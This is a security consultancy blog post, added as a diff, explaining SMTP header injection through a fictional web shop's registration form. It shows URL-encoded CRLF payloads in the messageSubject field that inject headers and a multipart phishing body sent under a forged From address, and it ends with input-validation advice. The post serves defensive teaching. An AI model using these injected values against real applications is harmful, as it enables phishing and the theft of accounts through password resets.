@@ -1,0 +1,158 @@
+---
+layout: blogpost
+title: "The Neglected Dangers of Email Functionality"
+author: "Tilman Bender"
+author_role: "Security Consultant"
+summary: "A great deal of web applications utilise email to implement functionalities such as user self-registration, password reset or a simple 'contact us' form."
+tags: [Vulnerabilities and exploits]
+hero_banner: Email__1010_350_75_s_c1.jpg
+---
+{% raw %}
+<article class="article-content">
+<p>What we know is that email is sent using one of the oldest protocols on the internet: <a href="https://www.ietf.org/rfc/rfc0821.txt">RFC 821</a> first defined the initial version of the Simple Mail Transfer Protocol (SMTP) in 1982. Since that time, there have been many improvements to the protocol but the basic format remains largely unchanged. SMTP is a text-based protocol where individual commands and their arguments are separated using a set of control characters (newlines, spaces, dot symbol etc.).</p>
+<p>The basic idea of SMTP Command Injection is to insert these control characters into parameters of a web application that are later used in an email. By doing so an attacker can break out of the context of one SMTP command and insert new commands to modify different aspects of the email that is sent in the background. </p>
+<h2>Why should I care?</h2>
+<p>Depending on the attacked functionality of the web application, the consequences can range from reputational damage over compromised user accounts to compromised systems. An attacker could use the injected SMTP commands to modify the content of a 'contact us' or self-registration email, turning it into a vehicle for spam or phishing. When attacking a password reset, an attacker could insert a second email recipient to receive a copy of the password reset email and gain access to user accounts. In rare cases where operating system tools such as Unix mail command are used to send email, this command injection technique can also be used to execute operating system commands.</p>
+<h2>The Target</h2>
+<p>Our example starts with an imaginary web shop. It provides new users with an innocuous looking self-registration function. The user enters their first name, last name and email address. A few seconds later, they receive a friendly welcome email to the address they provided. Below you can see the HTTP POST request used to register a user. </p>
+<pre class="prettyprint">POST /register.jsp HTTP/1.1
+Host: cannedunicorn.contextis.com
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 4415
+Connection: close
+Pragma: no-cache
+Cache-Control: no-cache
+
+title=Mr&amp;firstname=Tilman&amp;lastname=
+Bender&amp; <a class="__cf_email__" data-cfemail="f7929a969e9bca839e9b9a9699d9959299939285b794989983928f839e84d994989a" href="/web/20200424031450/https://www.contextis.com/cdn-cgi/l/email-protection">[email protected]</a>&amp;messageSubject=Thanks+for+registering&amp;messageFrom=registration%40cannedunicorn.contextis.com&amp; password=secret&amp; password-confirm=secret&amp;register=Continue</pre>
+<p>After sending the above request, we receive the following email: </p>
+<figure class="img-width-2-3">
+<div class="modal-img-container">
+<picture>
+<!--[if IE 9]><video style="display: none;"><![endif]-->
+<source media="(min-width: 768px)" srcset="/blog/assets/media/email.width-800__800_440_s_c1.png"/>
+<!--[if IE 9]></video><![endif]-->
+<img alt="" srcset="/blog/assets/media/email.width-800__800_440_s_c1.png"/>
+</picture>
+<div class="modal-hover">
+<a class="modal-img hidden-xs" href="/web/20200424031450/https://www.contextis.com/media/images/content/email.width-800_.png"></a>
+<a class="modal-img visible-xs" href="/web/20200424031450/https://www.contextis.com/media/images/content/email.width-800_.png"></a>
+</div>
+</div><!-- /modal-img-container -->
+</figure>
+<p>Looking at the email with a text editor reveals the following email including its mail headers</p>
+<pre class="prettyprint">Received: from  […SNIP…]
+Date: Thu, 3 Mar 2016 13:46:50 +0000 (GMT)
+From: <a class="__cf_email__" data-cfemail="a5d7c0c2ccd6d1d7c4d1cccacbe5c6c4cbcbc0c1d0cbccc6cad7cb8bc6cacbd1c0ddd1ccd68bc6cac8" href="/web/20200424031450/https://www.contextis.com/cdn-cgi/l/email-protection">[email protected]</a>
+To: <a class="__cf_email__" data-cfemail="8efae7e2e3efe0a0ecebe0eaebfcceede1e0faebf6fae7fda0ede1e3" href="/web/20200424031450/https://www.contextis.com/cdn-cgi/l/email-protection">[email protected]</a>
+Subject: Thanks for registering
+Return-Path: <a class="__cf_email__" data-cfemail="15617c7978747b3b77707b71706755767a7b61706d617c663b767a3b607e" href="/web/20200424031450/https://www.contextis.com/cdn-cgi/l/email-protection">[email protected]</a>
+Sender: <a class="__cf_email__" data-cfemail="196b7c7e706a6d6b786d707677597a7877777c7d6c77707a766b77377a76776d7c616d706a377a7674" href="/web/20200424031450/https://www.contextis.com/cdn-cgi/l/email-protection">[email protected]</a>
+MIME-Version: 1.0
+Content-Type: text/plain; 
+
+Dear Mr Bender,
+
+Welcome to Context's canned unicorn meat delivery service.
+
+kind regards,
+
+your friends at Context</pre>
+<p>At a very high level, the message consists of two parts: a set of message headers (everything up to Content-Type) and the message body (marked above in grey) separated from the headers by a blank line. Upon closer inspection, we find that the values of some parameters in the above HTTP-request show up again in the email as header-values: messageSubject, messageFrom.</p>
+<p>These would be potential candidates for a SMTP Command Injection tests. While those two parameters are rather obvious candidates for injection, the format for email addresses defined in RFC 2822 hints at two more candidates: The format also allows email addresses of the following form:</p>
+<pre class="prettyprint">Tilman Bender &lt;<a class="__cf_email__" data-cfemail="2e5a4742434f40004c4b404a4b5c6e4d41405a4b565a475d004d4143" href="/web/20200424031450/https://www.contextis.com/cdn-cgi/l/email-protection">[email protected]</a>&gt;</pre>
+<p>So we can consider the firstname and lastname parameters as candidates for injection as well.</p>
+<h2>Testing for SMTP Command Injection</h2>
+<p>The attacker starts with the messageSubject parameter, which is reflected in the Subject SMTP header of the welcome email.</p>
+<p>To determine if the parameter is vulnerable the attacker appends two additional characters to the value of messageSubject: carriage return (CR) and line feed (LF) followed by the text X-Foo: bar. The two control characters will indicate to the processing SMTP server that the Subject: command is finished. A new header named X-FOO with the value bar then follows the CRLF. Using the X- Prefix is still a common method to define custom protocol headers and is also used in protocols other protocols such as HTTP and FTP but has found wide use with software processing emails add additional information such as the results anti-virus or anti-spam checks. For this reason, most mail servers leave these headers alone. If the victims email gateway were configured restrictively stripping out custom headers, the attacker could use one of the standard headers such as blind carbon copy (BCC:) instead of X-Foo to have a copy of the email forwarded to an address under their control.</p>
+<p>The following snippet shows the modified messageSubject parameter with its new value. The characters highlighted in yellow introduce the extra carriage return (represented by the hexadecimal ASCII code 0x0d) and line feed (hex ASCII: 0x0a), whereas the characters highlighted in blue introduce the new header and its value. The control characters such as CR, LF, colon and space have been encoded using <a href="https://en.wikipedia.org/wiki/Percent-encoding">URL encoding</a>.</p>
+<pre class="prettyprint">messageSubject=Thanks+for+registering%0d%0aX-FOO%3A%20bar</pre>
+<p>After submitting the modified HTTP request, the attacker receives the following email:</p>
+<pre class="prettyprint">Received: from  ...
+Date: Thu, 3 Mar 2016 13:50:50 +0000 (GMT)
+From: <a class="__cf_email__" data-cfemail="3d4f585a544e494f5c495452537d5e5c535358594853545e524f53135e525349584549544e135e5250" href="/web/20200424031450/https://www.contextis.com/cdn-cgi/l/email-protection">[email protected]</a>
+To: <a class="__cf_email__" data-cfemail="d2a6bbbebfb3bcfcb0b7bcb6b7a092b1bdbca6b7aaa6bba1fcb1bdbf" href="/web/20200424031450/https://www.contextis.com/cdn-cgi/l/email-protection">[email protected]</a>
+Subject: Thanks for registering
+X-FOO: bar
+Return-Path: <a class="__cf_email__" data-cfemail="6b1f0207060a0545090e050f0e192b0804051f0e131f0218450804451e00" href="/web/20200424031450/https://www.contextis.com/cdn-cgi/l/email-protection">[email protected]</a>
+Sender: registration%40cannedunicorn.contextis.com
+MIME-Version: 1.0
+Content-Type: text/plain; 
+
+Dear Mr Bender,
+
+Welcome to Context's canned unicorn meat delivery service.
+
+kind regards,
+
+your friends at Context</pre>
+<p>The important part to understand here is that the attacker can modify whatever comes after the Subject header. Conveniently, the attacker also finds they can control what appears in the From: header of the email via the messageFrom parameter. With that, the attacker has everything they need to mount a very convincing phishing attack.</p>
+<h2>The Most Convincing Phish</h2>
+<p>The attacker wants to use the registration function to send phishing emails enticing users to submit their credentials to an attacker-controlled website. Forging the sender’s address is easy, as the attacker just needs to modify the messageFrom parameter.</p>
+<p>What is left for the attacker to do is use SMTP commands that will tell the SMTP server to treat the attacker’s email content as the primary content, and treat the original content in a way so it is not displayed to the end-user. One way to achieve this is by inserting a new Content-Type header to change the type to multipart/mixed. </p>
+<p>This will tell an email client that the message consists of two parts, where the attacker’s injected content is the first part and will be displayed to the user. The original content will be treated as an attachment and not displayed. To achieve this, the attacker sets the messageSubject as follows:</p>
+<pre class="prettyprint">messageSubject=Change+your+password%0d%0aMIME-Version:%201.0%0d%0aContent-Type:%20multipart/mixed%3Bboundary=ContextContextContext%0d%0a--ContextContextContext%0d%0aContent-Type:%20text/html%0d%0aContent-Transfer-Encoding%3a%20base64%0d%0a%0d%0aRGVhciBVc2VyLDxicj5QbGVhc2UgY2xpY2sgPGEgaHJlZj0iaHR0cDovL3d3dy5jb250ZXh0LmNvbSI%2baGVyZTwvYT4gdG8gY2hhbmdlIHlvdXIgcGFzc3dvcmQu%0d%0a%0d%0a--ContextContextContext--</pre>
+<p>Submitting the registration form with the modified messageSubject parameter will result in the following email:</p>
+<pre class="prettyprint">Received: from […SNIP…]
+Date: Fri, 4 Mar 2016 13:43:48 +0000 (GMT)
+From: <a class="__cf_email__" data-cfemail="d0a3b5b3a5a2b9a4a990b3bfbea4b5a8a4b9a3feb3bfbd" href="/web/20200424031450/https://www.contextis.com/cdn-cgi/l/email-protection">[email protected]</a>
+To: <a class="__cf_email__" data-cfemail="3c485550515d52125e595258594e7c5f535248594448554f125f5351" href="/web/20200424031450/https://www.contextis.com/cdn-cgi/l/email-protection">[email protected]</a>
+Subject: Change your password
+MIME-Version: 1.0
+Content-Type:
+ multipart/mixed;boundary=ContextContextContext
+Return-Path: <a class="__cf_email__" data-cfemail="acdfc9cfd9dec5d8d5eccfc3c2d8c9d4d8c5df82cfc3c1" href="/web/20200424031450/https://www.contextis.com/cdn-cgi/l/email-protection">[email protected]</a>
+Sender: <a class="__cf_email__" data-cfemail="b2c1d7d1c7c0dbc6cbf2d1dddcc6d7cac6dbc19cd1dddf" href="/web/20200424031450/https://www.contextis.com/cdn-cgi/l/email-protection">[email protected]</a>
+
+--ContextContextContext
+Content-Type: text/html
+Content-Transfer-Encoding: base64
+
+RGVhciBVc2VyLDxicj5QbGVhc2UgY2xpY2sgPGEgaHJlZj0iaHR0cDovL3d3dy5jb250ZXh0LmNvbSI+aGVyZTwvYT4gdG8gY2hhbmdlIHlvdXIgcGFzc3dvcmQu
+
+--ContextContextContext--
+MIME-Version: 1.0
+Content-Type: text/plain; 
+
+Dear Mr Bender,
+
+Welcome to Context's canned unicorn meat delivery service.
+
+kind regards,
+
+your friends at Context</pre>
+<p>The coloured text in the message above is the result of our SMTP Command Injection. The original text of the email has been appended after the ending boundary, but since the attacker chose the content type to be multipart/mixed this content will be ignored. The content of the message has been base64-encoded to prevent characters inside the content from interfering with the parsing of the email. When decoded, the message reads as follows:</p>
+<pre class="prettyprint">Dear User,
+Please click &lt;a href="http://www.context.com"&gt;here&lt;/a&gt; to change your password.</pre>
+<p>The result looks as shown below:</p>
+<figure class="img-width-2-3">
+<div class="modal-img-container">
+<picture>
+<!--[if IE 9]><video style="display: none;"><![endif]-->
+<source media="(min-width: 768px)" srcset="/blog/assets/media/email_m5l21I1.width-800__800_506_s_c1.png"/>
+<!--[if IE 9]></video><![endif]-->
+<img alt="" srcset="/blog/assets/media/email_m5l21I1.width-800__800_506_s_c1.png"/>
+</picture>
+<div class="modal-hover">
+<a class="modal-img hidden-xs" href="/web/20200424031450/https://www.contextis.com/media/images/content/email_m5l21I1.width-800_.png"></a>
+<a class="modal-img visible-xs" href="/web/20200424031450/https://www.contextis.com/media/images/content/email_m5l21I1.width-800_.png"></a>
+</div>
+</div><!-- /modal-img-container -->
+</figure>
+<p>So here we are: The attacker has just coerced the web application into sending a phishing email to an unwitting user.</p>
+<h2>How do I protect my web application?</h2>
+<p>Here are some steps to prevent this from happening to your website:</p>
+<ul>
+<li>Do not provide the attacker with more input fields than necessary. Fields like the subject of an email or the sender's email address should be filled by the server processing the user's registration request and not be unnecessarily exposed to the user.</li>
+<li>Do not rely blindly on APIs provided by frameworks. As users of JavaMail found out, the framework authors might consider input validation your <a href="http://seclists.org/fulldisclosure/2014/May/81">responsibility</a>.</li>
+<li>Do validate all input fields using a white-list approach. That is: define the allowed content for input fields as strictly as possible and reject anything that does not match your definition of valid input.</li>
+<li>Input fields, that make it into the To or Subject email headers of an email must not be allowed to contain the carriage return or newline characters.</li>
+<li>Do not limit your input validation to the client side (using JavaScript), but make sure to validate input on the server side.</li>
+</ul>
+<h2>Summary and Conclusions</h2>
+<p>This blog post showed only a simple scenario of what could happen, if user input is included into email messages without prior validation. Phishing and distribution of unsolicited email in your name is only one of the possible consequences. Fortunately, SMTP Header injections are a rare find these days, since most of the libraries do validate trivial injection vectors such as the recipient. However, as a developer you should always make sure that any field included into an email has been properly validated.</p>
+</article>
+{% endraw %}
